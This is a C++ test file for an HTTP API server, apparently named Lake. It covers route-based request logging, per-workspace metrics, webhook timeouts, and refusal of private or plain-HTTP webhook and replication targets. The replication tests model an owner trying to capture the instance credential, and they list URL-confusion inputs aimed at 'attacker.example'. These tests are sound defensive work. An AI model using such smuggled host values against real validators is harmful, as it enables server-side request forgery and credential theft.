    ASSERT_GE(keep_alive, 0);
    ASSERT_TRUE(send_all(keep_alive,
                         "GET /healthz HTTP/1.1\r\n"
                         "Host: localhost\r\n"
                         "Connection: keep-alive\r\n\r\n"));
    const std::string first_response = read_response(keep_alive, false);
    ASSERT_NE(first_response.find(" 200 "), std::string::npos) << first_response;
    ::close(keep_alive);

    const int confirmation = connect_loopback(server.port());
    ASSERT_GE(confirmation, 0);
    ASSERT_TRUE(send_all(confirmation,
                         "GET /healthz HTTP/1.1\r\n"
                         "Host: localhost\r\n"
                         "Connection: close\r\n\r\n"));
    const std::string confirmation_response = read_response(confirmation, true);
    ::close(confirmation);
    ASSERT_NE(confirmation_response.find(" 200 "), std::string::npos) << confirmation_response;

    server.stop();
    EXPECT_EQ(captured_stderr.finish(), "");
}

// Decision 54 S9 (lake#384): a request log line names the route pattern and the identifiers it
// captured, never the raw path, and a request routed to a workspace is counted in that workspace's
// own `lake_requests` series by the owner loop.
TEST(HttpServer, RequestLogsNameRoutesAndEachWorkspaceGetsItsOwnRequestSeries) {
    auto store = std::make_shared<lake::control::InMemoryStore>();
    lake::test::RecordWorkspaces workspaces(store);
    const auto create_space = [&store](const std::string& handle) {
        const auto user = store->create_user(
            {"taap:1:ed25519:" + handle, handle + "@example.test", handle});
        EXPECT_TRUE(user) << user.error().message;
        const auto customer = store->create_customer({"individual", user->id, "", handle});
        EXPECT_TRUE(customer) << customer.error().message;
        return customer->id;
    };
    const std::string mine = create_space("request-series-mine");
    const std::string theirs = create_space("request-series-theirs");
    const std::string home = workspaces.create(mine, "home");
    const std::string lab = workspaces.create(mine, "lab");
    const std::string other = workspaces.create(theirs, "home");
    const auto repository =
        store->create_repository({mine, "secret-project", "", "private", home});
    ASSERT_TRUE(repository) << repository.error().message;

    lake::api::ServerOptions options;
    options.port = 0;
    options.worker_coroutines = 1;
    options.node_name = "request-series";
    options.admin_token = "request-series-admin";
    options.instance_kek = "726571756573742d7365726965732d696e7374616e63652d6b656b2d74657374";
    options.store = store;
    options.workspaces = workspaces.service;
    options.request_series_flush_interval = std::chrono::milliseconds(0);
    lake::api::ApiServer server(options);
    ASSERT_TRUE(server.start()) << server.reason();

    std::string output;
    std::vector<std::string> statuses;
    {
        OutputPipe captured(STDOUT_FILENO, stdout);
        ASSERT_TRUE(captured.ready());
        HttpConnection connection(server.port());
        const auto get = [&](const std::string& path, std::string_view bearer = {}) {
            const std::string response = connection.request(
                "GET", path, {}, {}, "HTTP/1.1", bearer, "application/json",
                {{"X-Request-Id", "request-384"}});
            statuses.push_back(response.substr(0, response.find("\r\n")));
        };
        const std::string admin = options.admin_token;
        // A repository read: its repository's workspace.
        get("/v1/get_repository?id=" + repository->id, admin);
        get("/v1/get_repository?id=" + repository->id, admin);
        // A capability naming its workspace: that workspace, in either space.
        get("/v1/workspace_status?customer_id=" + mine + "&workspace_id=" + lab, admin);
        get("/v1/workspace_status?customer_id=" + theirs + "&workspace_id=" + other, admin);
        // No workspace: counted nowhere.
        get("/v1/server_info");
        // Registry, drive and repository sync routes whose paths carry names.
        get("/secret-package");
        get("/v2/" + mine + "/secret-image/manifests/latest", admin);
        get("/drive/download?repository_id=" + repository->id +
                "&path=secret-folder/secret-file.txt",
            admin);
        // A download that cannot be served closes its connection; the sync call uses its own.
        HttpConnection sync_connection(server.port());
        const std::string pull =
            sync_connection.request("POST",
                                    "/v1/repositories/" + repository->id + "/sync/pull",
                                    "not a sync request",
                                    {},
                                    "HTTP/1.1",
                                    admin,
                                    "application/octet-stream",
                                    {{"X-Request-Id", "request-384"}});
        statuses.push_back(pull.substr(0, pull.find("\r\n")));
        // A handler sends its response and then logs and counts the request, so the client can
        // hold the last answer before that request is counted (lake#547: on Linux an owner-loop
        // flush here ran first and the stop flushed home's series a second time). stop() waits for
        // every request to finish and then flushes once.
        server.stop();
        output = captured.finish();
    }

    std::vector<nlohmann::json> lines;
    std::istringstream stream(output);
    for (std::string text; std::getline(stream, text);) {
        const auto line = nlohmann::json::parse(text, nullptr, false);
        if (!line.is_discarded() && line.is_object() && line.contains("route")) {
            lines.push_back(line);
        }
    }
    ASSERT_EQ(lines.size(), 9U) << output;
    for (const auto& line : lines) {
        EXPECT_FALSE(line.contains("path")) << line.dump();
        EXPECT_EQ(line["node"], "request-series");
        EXPECT_EQ(line["request_id"], "request-384") << line.dump();
    }
    EXPECT_EQ(output.find("secret-package"), std::string::npos) << output;
    EXPECT_EQ(output.find("secret-image"), std::string::npos) << output;
    EXPECT_EQ(output.find("secret-file"), std::string::npos) << output;
    EXPECT_EQ(output.find("secret-project"), std::string::npos) << output;
    EXPECT_EQ(lines[0]["route"], "/v1/get_repository");
    EXPECT_EQ(lines[0]["capability"], "get_repository");
    EXPECT_EQ(lines[0]["workspace_id"], home);
    EXPECT_EQ(lines[2]["workspace_id"], lab);
    EXPECT_EQ(lines[3]["workspace_id"], other);
    EXPECT_FALSE(lines[4].contains("workspace_id"));
    EXPECT_EQ(lines[5]["route"], "/:package");
    EXPECT_EQ(lines[6]["route"], "/v2/:space/:repository/manifests/:reference");
    EXPECT_EQ(lines[7]["route"], "/drive/download");
    EXPECT_EQ(lines[8]["route"], "/v1/repositories/:repository_id/sync/pull");
    EXPECT_EQ(lines[8]["repository_id"], repository->id);

    // Two workspaces of one space and one of another: three separate series.
    auto& home_series = workspaces.records(home);
    EXPECT_EQ(home_series.metric_total("lake_requests",
                                       {{"route", "/v1/get_repository"},
                                        {"capability", "get_repository"},
                                        {"status_class", "2xx"}}),
              2)
        << statuses[0];
    EXPECT_EQ(workspaces.records(lab).metric_total("lake_requests"), 1) << statuses[2];
    EXPECT_EQ(workspaces.records(lab).metric_total(
                  "lake_requests", {{"capability", "workspace_status"}}),
              1);
    EXPECT_EQ(workspaces.records(other).metric_total("lake_requests"), 1) << statuses[3];
    EXPECT_EQ(home_series.metric_total("lake_requests", {{"route", "/v1/server_info"}}), 0);
    EXPECT_EQ(home_series.metric_total("lake_requests", {{"route", "/:package"}}), 0);
    // Nothing reached the workspace on the request path: only the flush at stop wrote, once for
    // `lake_requests` and once for the same calls in `lake_usage` (lake#564).
    EXPECT_EQ(std::ranges::count(home_series.calls, std::string("record_metric")), 2);
    // Every capability call routed to the workspace is one call: the two reads and the sync pull.
    EXPECT_EQ(home_series.metric_total("lake_usage", {{"dimension", "calls"}, {"kind", "api"}}), 3);
    EXPECT_EQ(home_series.metric_total("lake_usage", {{"dimension", "calls"}, {"kind", "mcp"}}), 0);
}

// A TCP endpoint on loopback that accepts every connection and never answers: the slow customer
// endpoint of lake#772. It counts the connections it took.
class SilentEndpoint {
public:
    SilentEndpoint() {
        descriptor_ = ::socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in address{};
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        socklen_t size = sizeof(address);
        ::bind(descriptor_, reinterpret_cast<sockaddr*>(&address), sizeof(address));
        ::listen(descriptor_, 16);
        ::getsockname(descriptor_, reinterpret_cast<sockaddr*>(&address), &size);
        port_ = ntohs(address.sin_port);
        thread_ = std::thread([this] {
            for (;;) {
                const int accepted = ::accept(descriptor_, nullptr, nullptr);
                if (accepted < 0) {
                    return;
                }
                std::lock_guard lock(mutex_);
                held_.push_back(accepted);
            }
        });
    }
    ~SilentEndpoint() {
        ::shutdown(descriptor_, SHUT_RDWR);
        ::close(descriptor_);
        thread_.join();
        for (const int held : held_) {
            ::close(held);
        }
    }
    unsigned short port() const {
        return port_;
    }
    std::size_t accepted() {
        std::lock_guard lock(mutex_);
        return held_.size();
    }

private:
    int descriptor_ = -1;
    unsigned short port_ = 0;
    std::thread thread_;
    std::mutex mutex_;
    std::vector<int> held_;
};

// One request on its own connection with a receive timeout longer than a webhook delivery's.
std::string slow_request(unsigned short port,
                         const std::string& path,
                         const std::string& body,
                         const std::string& bearer) {
    const int socket_fd = connect_loopback(port);
    timeval timeout{};
    timeout.tv_sec = 30;
    static_cast<void>(::setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)));
    const std::string wire =
        "POST " + path + " HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n" +
        "Content-Type: application/json\r\nAuthorization: Bearer " + bearer +
        "\r\nContent-Length: " + std::to_string(body.size()) + "\r\n\r\n" + body;
    std::string response;
    if (send_all(socket_fd, wire)) {
        response = read_response(socket_fd, true);
    }
    ::close(socket_fd);
    return response;
}

struct WebhookServer {
    std::shared_ptr<lake::control::InMemoryStore> store =
        std::make_shared<lake::control::InMemoryStore>();
    lake::test::RecordWorkspaces workspaces{store};
    std::unique_ptr<lake::api::ApiServer> server;
    std::string repository_id;

    explicit WebhookServer(bool allow_private) {
        lake::api::ServerOptions options;
        options.port = 0;
        options.store = store;
        options.admin_token = "webhook-operator";
        options.instance_kek = std::string(64, '7');
        options.store_root =
            lake::test::fixture_path("webhook-store-" + lake::control::new_uuid_v4()).string();
        options.workspaces = workspaces.service;
        options.webhook_allow_private_addresses = allow_private;
        server = std::make_unique<lake::api::ApiServer>(options);
        if (!server->start()) {
            throw std::runtime_error(server->reason());
        }
        const auto user = store->create_user({"taap:1:ed25519:webhook-owner", "", "Owner"});
        const auto customer = store->create_customer({"individual", user->id, "", "hooks"});
        const std::string workspace = workspaces.create(customer->id, "home");
        const auto created =
            call("create_repository",
                 {{"customer_id", customer->id}, {"workspace_id", workspace}, {"name", "hooks"}});
        if (!created.value("ok", false)) {
            throw std::runtime_error("create_repository: " + created.dump());
        }
        repository_id = created["value"]["id"];
    }

    nlohmann::json call(const std::string& capability, const nlohmann::json& input) {
        const std::string response =
            slow_request(server->port(), "/v1/" + capability, input.dump(), "webhook-operator");
        const std::string body = response_body(response);
        if (body.empty()) {
            throw std::runtime_error(capability + " answered no body: " + response);
        }
        return nlohmann::json::parse(body);
    }

    std::string webhook(const std::string& url) {
        const auto created = call("create_webhook",
                                  {{"repository_id", repository_id},
                                   {"url", url},
                                   {"events", nlohmann::json::array({"ping"})},
                                   {"secret", "hook-secret"}});
        if (!created.value("ok", false)) {
            throw std::runtime_error("create_webhook: " + created.dump());
        }
        return created["value"]["id"];
    }
};

// lake#772: a delivery to an endpoint that never answers runs off the server's own thread, so lake
// keeps answering everything else while it waits, and the delivery gives up after its 10 s limit
// with the attempt recorded.
TEST(WebhookDelivery, ASilentEndpointDoesNotStopLakeAndTimesOut) {
    SilentEndpoint endpoint;
    WebhookServer lake_server(true);
    const std::string webhook =
        lake_server.webhook("https://127.0.0.1:" + std::to_string(endpoint.port()) + "/hook");

    const auto started = std::chrono::steady_clock::now();
    auto delivery = std::async(std::launch::async, [&] {
        return lake_server.call("deliver_webhook",
                                {{"repository_id", lake_server.repository_id},
                                 {"webhook_id", webhook},
                                 {"event", "ping"},
                                 {"payload", {{"hello", "world"}}}});
    });
    for (int i = 0; i < 50 && endpoint.accepted() == 0; ++i) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    ASSERT_GE(endpoint.accepted(), 1U) << "the delivery never reached the endpoint";
    for (int probe = 0; probe < 3; ++probe) {
        const auto asked = std::chrono::steady_clock::now();
        HttpConnection connection(lake_server.server->port());
        const std::string health = connection.request("GET", "/healthz");
        const std::string info = connection.request("GET", "/v1/server_info");
        EXPECT_TRUE(health.starts_with("HTTP/1.1 200")) << health;
        EXPECT_TRUE(info.starts_with("HTTP/1.1 200")) << info;
        EXPECT_LT(std::chrono::steady_clock::now() - asked, std::chrono::seconds(2))
            << "lake stopped answering while a webhook delivery waited";
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    const nlohmann::json answered = delivery.get();
    const auto waited = std::chrono::steady_clock::now() - started;
    ASSERT_TRUE(answered["ok"]) << answered.dump();
    EXPECT_FALSE(answered["value"]["value"]["delivered"]);
    EXPECT_NE(answered["value"]["value"]["error"].get<std::string>(), "");
    EXPECT_LT(waited, std::chrono::seconds(15)) << "the delivery outlived its limit";
}

// lake#876: without the operator setting, a webhook reaches only HTTPS on public addresses. A
// loopback target is refused before any connection is made, and plain HTTP is refused outright.
TEST(WebhookDelivery, PrivateAddressesAndPlainHttpAreRefused) {
    SilentEndpoint endpoint;
    WebhookServer lake_server(false);
    for (const std::string url :
         {"https://127.0.0.1:" + std::to_string(endpoint.port()) + "/hook",
          "https://localhost:" + std::to_string(endpoint.port()) + "/hook",
          "http://127.0.0.1:" + std::to_string(endpoint.port()) + "/hook"}) {
        const std::string webhook = lake_server.webhook(url);
        const nlohmann::json answered =
            lake_server.call("deliver_webhook",
                             {{"repository_id", lake_server.repository_id},
                              {"webhook_id", webhook},
                              {"event", "ping"},
                              {"payload", nlohmann::json::object()}});
        ASSERT_TRUE(answered["ok"]) << url << ": " << answered.dump();
        const auto& attempt = answered["value"]["value"];
        EXPECT_FALSE(attempt["delivered"]) << url;
        const std::string error = attempt["error"];
        EXPECT_TRUE(error.find("not a public address") != std::string::npos ||
                    error.find("must use HTTPS") != std::string::npos)
            << url << ": " << error;
    }
    EXPECT_EQ(endpoint.accepted(), 0U) << "a refused webhook still connected";
}

// lake#915: a loopback HTTP endpoint that records the request head of every connection it takes,
// then answers 500. It stands in for a server a caller controls.
class RecordingEndpoint {
public:
    RecordingEndpoint() {
        descriptor_ = ::socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in address{};
        address.sin_family = AF_INET;
        address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        socklen_t size = sizeof(address);
        ::bind(descriptor_, reinterpret_cast<sockaddr*>(&address), sizeof(address));
        ::listen(descriptor_, 16);
        ::getsockname(descriptor_, reinterpret_cast<sockaddr*>(&address), &size);
        port_ = ntohs(address.sin_port);
        thread_ = std::thread([this] {
            for (;;) {
                const int accepted = ::accept(descriptor_, nullptr, nullptr);
                if (accepted < 0) {
                    return;
                }
                timeval timeout{};
                timeout.tv_sec = 3;
                static_cast<void>(
                    ::setsockopt(accepted, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)));
                std::string head;
                char buffer[4096];
                while (head.find("\r\n\r\n") == std::string::npos) {
                    const auto got = ::recv(accepted, buffer, sizeof(buffer), 0);
                    if (got <= 0) {
                        break;
                    }
                    head.append(buffer, static_cast<std::size_t>(got));
                }
                static_cast<void>(send_all(
                    accepted, "HTTP/1.1 500 x\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"));
                ::close(accepted);
                std::lock_guard lock(mutex_);
                heads_.push_back(std::move(head));
            }
        });
    }
    ~RecordingEndpoint() {
        ::shutdown(descriptor_, SHUT_RDWR);
        ::close(descriptor_);
        thread_.join();
    }
    unsigned short port() const {
        return port_;
    }
    std::string origin() const {
        return "http://127.0.0.1:" + std::to_string(port_);
    }
    std::vector<std::string> heads() {
        std::lock_guard lock(mutex_);
        return heads_;
    }

private:
    int descriptor_ = -1;
    unsigned short port_ = 0;
    std::thread thread_;
    std::mutex mutex_;
    std::vector<std::string> heads_;
};

constexpr auto replication_secret = "instance-replication-credential";

// A Lake with a repository whose owner holds admin on it (as every sign-up does on its own
// repositories), and the operator's replication credential configured.
struct ReplicationServer {
    std::shared_ptr<lake::control::InMemoryStore> store =
        std::make_shared<lake::control::InMemoryStore>();
    lake::test::RecordWorkspaces workspaces{store};
    std::unique_ptr<lake::api::ApiServer> server;
    std::string repository_id;
    std::string customer_id;
    std::string owner_token;

    ReplicationServer(std::vector<std::string> peers,
                      bool allow_private,
                      std::chrono::seconds timeout = std::chrono::seconds(600)) {
        lake::api::ServerOptions options;
        options.port = 0;
        options.store = store;
        options.admin_token = "replication-operator";
        options.replication_token = replication_secret;
        options.replication_peers = std::move(peers);
        options.replication_allow_private_addresses = allow_private;
        options.replication_timeout = timeout;
        options.instance_kek = std::string(64, '7');
        options.store_root =
            lake::test::fixture_path("replication-store-" + lake::control::new_uuid_v4()).string();
        options.workspaces = workspaces.service;
        server = std::make_unique<lake::api::ApiServer>(options);
        if (!server->start()) {
            throw std::runtime_error(server->reason());
        }
        const auto user =
            store->create_user({"taap:1:ed25519:replication-owner", "", "Repository Owner"});
        const auto customer = store->create_customer({"individual", user->id, "", "replicas"});
        customer_id = customer->id;
        const std::string workspace = workspaces.create(customer->id, "home");
        const auto created = call(
            "create_repository",
            {{"customer_id", customer->id}, {"workspace_id", workspace}, {"name", "replicated"}},
            "replication-operator");
        if (!created.value("ok", false)) {
            throw std::runtime_error("create_repository: " + created.dump());
        }
        repository_id = created["value"]["id"];
        const auto object = store->find_policy_object("repository", repository_id);
        if (!object || !store->create_grant({user->taap_id,
                                             object->id,
                                             "admin",
                                             "attestation-owner",
                                             "admin",
                                             "request-owner"})) {
            throw std::runtime_error("could not grant the owner admin on the repository");
        }
        const auto token =
            store->create_token({user->id, "lake", "owner", "test", {"*"}, 300, false});
        if (!token) {
            throw std::runtime_error(token.error().message);
        }
        owner_token = token->secret;
    }

    nlohmann::json
    call(const std::string& capability, const nlohmann::json& input, const std::string& bearer) {
        const std::string response =
            slow_request(server->port(), "/v1/" + capability, input.dump(), bearer);
        const std::string body = response_body(response);
        if (body.empty()) {
            throw std::runtime_error(capability + " answered no body: " + response);
        }
        return nlohmann::json::parse(body);
    }

    nlohmann::json replicate(const std::string& source_url, const std::string& bearer) {
        return call("replicate_repository",
                    {{"repository_id", repository_id},
                     {"source_instance", "region-a"},
                     {"source_url", source_url}},
                    bearer);
    }
};

// lake#915 (LSR-004): a repository owner points replicate_repository at a server they run. Lake
// refuses it before connecting, so the instance's replication credential is never sent there. The
// operator is refused the same way: only configured peers receive the credential. The refusal is
// audited in the customer's log with the source it named.
TEST(RepositoryReplication, ASourceThatIsNotAConfiguredPeerNeverReceivesTheCredential) {
    RecordingEndpoint endpoint;
    ReplicationServer lake_server({"https://region-a.lake.example"}, true);

    for (const std::string& bearer :
         {lake_server.owner_token, std::string("replication-operator")}) {
        for (const std::string& source :
             {endpoint.origin(), endpoint.origin() + "/", endpoint.origin() + "/elsewhere"}) {
            const nlohmann::json answered = lake_server.replicate(source, bearer);
            ASSERT_FALSE(answered.value("ok", true)) << source << ": " << answered.dump();
            EXPECT_EQ(answered["error"]["code"], "invalid_input") << answered.dump();
            EXPECT_EQ(answered["error"]["path"], "/source_url") << answered.dump();
        }
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(200));
    EXPECT_TRUE(endpoint.heads().empty())
        << "lake connected to a source that is not a configured peer:\n"
        << endpoint.heads().front();

    // Repository events go to the repository's workspace audit (decision 52); `audit` reads it.
    HttpConnection reader(lake_server.server->port());
    const std::string answered_audit =
        reader.request("GET",
                       "/v1/audit?customer_id=" + lake_server.customer_id + "&object=repository/" +
                           lake_server.repository_id + "&limit=200",
                       {},
                       {},
                       "HTTP/1.1",
                       "replication-operator");
    const nlohmann::json audit =
        nlohmann::json::parse(response_body(answered_audit), nullptr, false);
    ASSERT_TRUE(audit.is_object() && audit.value("ok", false)) << answered_audit;
    const auto& items = audit["value"]["items"];
    const auto refusals = std::ranges::count_if(items, [&](const nlohmann::json& event) {
        return event.value("action", "") == "replicate_repository" &&
               event.value("outcome", "") == "failure" &&
               event["details"].value("refused_source_url", "").starts_with(endpoint.origin());
    });
    EXPECT_EQ(refusals, 6) << items.dump();
}

// lake#915: even a configured peer is reached only over HTTPS on public addresses, unless the
// operator allows private ones (LAKE_REPLICATION_ALLOW_PRIVATE_ADDRESSES=1).
TEST(RepositoryReplication, APeerOnAPrivateAddressOrPlainHttpIsRefusedBeforeConnecting) {
    RecordingEndpoint endpoint;
    const std::string https_loopback = "https://127.0.0.1:" + std::to_string(endpoint.port());
    const std::string https_localhost = "https://localhost:" + std::to_string(endpoint.port());
    ReplicationServer lake_server({endpoint.origin(), https_loopback, https_localhost}, false);
    for (const std::string& source : {endpoint.origin(), https_loopback, https_localhost}) {
        const nlohmann::json answered = lake_server.replicate(source, "replication-operator");
        ASSERT_FALSE(answered.value("ok", true)) << source << ": " << answered.dump();
        const std::string message = answered["error"]["message"];
        EXPECT_TRUE(message.find("not a public address") != std::string::npos ||
                    message.find("must use HTTPS") != std::string::npos)
            << source << ": " << message;
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(200));
    EXPECT_TRUE(endpoint.heads().empty()) << endpoint.heads().front();
}

// lake#915: a configured peer that accepts the connection and never answers holds one pull for at
// most LAKE_REPLICATION_TIMEOUT_SECONDS, and Lake keeps answering meanwhile.
TEST(RepositoryReplication, APeerThatNeverAnswersTimesOut) {
    SilentEndpoint endpoint;
    const std::string origin = "http://127.0.0.1:" + std::to_string(endpoint.port());
    ReplicationServer lake_server({origin}, true, std::chrono::seconds(2));
    const auto started = std::chrono::steady_clock::now();
    auto replicated = std::async(
        std::launch::async, [&] { return lake_server.replicate(origin, "replication-operator"); });
    for (int i = 0; i < 50 && endpoint.accepted() == 0; ++i) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    ASSERT_GE(endpoint.accepted(), 1U) << "the pull never reached the peer";
    HttpConnection connection(lake_server.server->port());
    const std::string health = connection.request("GET", "/healthz");
    EXPECT_TRUE(health.starts_with("HTTP/1.1 200")) << health;
    const nlohmann::json answered = replicated.get();
    EXPECT_LT(std::chrono::steady_clock::now() - started, std::chrono::seconds(15));
    ASSERT_FALSE(answered.value("ok", true)) << answered.dump();
    EXPECT_EQ(answered["error"]["code"], "store_unavailable") << answered.dump();
    EXPECT_NE(answered["error"]["message"].get<std::string>().find("did not finish"),
              std::string::npos)
        << answered.dump();
}

// lake#915: what LAKE_REPLICATION_PEERS accepts, and how a source is matched to it.
TEST(RepositoryReplication, PeersAreOriginsAndOnlyAConfiguredOriginMatches) {
    const auto peers = lake::api::parse_replication_peers(
        "https://Region-A.lake.example, "
        "https://region-b.lake.example:8443/\nhttp://127.0.0.1:4900");
    ASSERT_TRUE(peers) << peers.error();
    EXPECT_EQ(*peers,
              (std::vector<std::string>{"https://region-a.lake.example",
                                        "https://region-b.lake.example:8443",
                                        "http://127.0.0.1:4900"}));
    EXPECT_TRUE(lake::api::parse_replication_peers("")->empty());
    for (const char* refused : {"region-a.lake.example",
                                "https://user@region-a.lake.example",
                                "https://region-a.lake.example/path",
                                "ftp://region-a.lake.example",
                                "http://region-a.lake.example"}) {
        EXPECT_FALSE(lake::api::parse_replication_peers(refused)) << refused;
    }
    EXPECT_TRUE(lake::api::replication_peer_allowed("https://region-a.lake.example/", *peers));
    EXPECT_TRUE(lake::api::replication_peer_allowed("https://region-a.lake.example:443", *peers));
    EXPECT_TRUE(lake::api::replication_peer_allowed("HTTPS://REGION-B.lake.example:8443", *peers));
    for (const char* refused : {"https://region-b.lake.example",
                                "https://region-a.lake.example:8443",
                                "https://region-a.lake.example.attacker.example",
                                "https://attacker.example",
                                "http://127.0.0.1:4901",
                                "https://region-a.lake.example@attacker.example"}) {
        EXPECT_FALSE(lake::api::replication_peer_allowed(refused, *peers)) << refused;
    }
}
